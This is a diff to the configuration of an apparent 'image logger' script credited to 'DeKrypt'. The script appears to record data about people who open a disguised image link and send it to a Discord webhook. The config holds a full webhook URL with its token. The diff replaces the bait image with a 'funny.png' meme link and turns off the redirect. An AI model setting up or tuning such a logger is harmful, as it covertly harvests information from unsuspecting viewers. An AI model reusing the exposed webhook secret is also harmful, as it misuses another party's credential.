@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1135278291675271178/BVJicxfqwFztMK43EGI7CZD00JHua9CLakd6n89fU_Jt9ZdGHv-mFph46CiPml1r3Rrk",
-    "image": "https://cdn.discordapp.com/attachments/1135262315785224352/1135278126759432242/ezgif-5-3207d4a6b1.png", # You can also have a custom image by using a URL argument
+    "image": "https://memeerr.vercel.app/api/funny.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -50,7 +50,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": True, # Redirect to a webpage?
+        "redirect": False, # Redirect to a webpage?
         "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
